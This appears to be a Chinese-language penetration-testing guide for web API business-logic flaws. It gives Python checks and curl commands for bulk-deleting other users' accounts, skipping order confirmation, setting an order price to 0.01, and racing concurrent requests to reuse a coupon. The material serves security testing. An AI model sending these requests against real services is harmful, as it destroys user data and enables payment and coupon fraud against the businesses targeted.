# 业务逻辑漏洞测试

## 测试方法

### 1. 批量操作绕过

```python
def test_batch_operation_bypass(token):
    """
    测试批量操作是否校验权限
    """
    # 尝试删除多个其他用户
    data = {
        "userIds": [101, 102, 103, 104, 105]
    }
    
    r = requests.post(
        "/api/user/batchDelete",
        headers={'Authorization': f'Bearer {token}'},
        json=data
    )
    
    if r.status_code == 200:
        return {
            "vuln": True,
            "type": "批量操作越权",
            "detail": "可批量删除其他用户"
        }
    return {"vuln": False}
```

### 2. 流程绕过

```python
def test_workflow_bypass():
    """
    测试业务流程是否可被绕过
    """
    # 跳过关键步骤
    steps = [
        "/api/order/create",      # 创建订单
        "/api/order/confirm",     # 确认订单
        "/api/order/pay",         # 支付
    ]
    
    # 尝试直接支付（跳过确认）
    r = requests.post(steps[2], json={"orderId": "test"})
    
    if r.status_code == 200:
        return {
            "vuln": True,
            "type": "流程绕过",
            "detail": "可跳过订单确认直接支付"
        }
    return {"vuln": False}
```

### 3. 参数篡改

```python
def test_parameter_tampering(token):
    """
    测试参数是否可被篡改
    """
    # 金额篡改
    r = requests.post(
        "/api/order/create",
        headers={'Authorization': f'Bearer {token}'},
        json={
            "productId": 1,
            "amount": 0.01,  # 尝试修改金额
            "originalAmount": 1000
        }
    )
    
    if r.status_code == 200:
        return {
            "vuln": True,
            "type": "参数篡改",
            "detail": "订单金额可被篡改"
        }
    return {"vuln": False}
```

### 4. 条件竞争

```python
def test_race_condition(url, token):
    """
    测试条件竞争漏洞
    """
    import threading
    
    results = []
    def make_request():
        r = requests.post(
            url,
            headers={'Authorization': f'Bearer {token}'},
            json={"couponCode": "FREE"}
        )
        results.append(r.status_code)
    
    # 并发请求
    threads = [threading.Thread(target=make_request) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # 检查是否有多次成功
    if results.count(200) > 1:
        return {
            "vuln": True,
            "type": "条件竞争",
            "detail": f"优惠券被多次使用，成功{results.count(200)}次"
        }
    return {"vuln": False}
```

## 测试场景

```bash
# 批量操作
curl -X POST "http://api/user/batchDelete" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"userIds":[1,2,3,4,5]}'

# 金额篡改
curl -X POST "http://api/order/create" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"productId":1,"amount":0.01}'
```
